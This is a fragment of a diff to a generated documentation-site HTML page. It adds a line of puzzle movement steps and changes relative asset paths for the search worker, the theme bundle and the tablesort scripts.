+<p><code>4 * down + left + down + 3 * left + up + left + up + left + right + up + left + up + up + left</code></p>
 
 
 
 
 
 
+
+  
+  
 
 
 
@@ -1275,14 +1476,14 @@ It is more of a step by step process to record my thought process, rather than a
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
       
-        <script src="js/tablesort.js"></script>
+        <script src="../../js/tablesort.js"></script>
       
     
   </body>
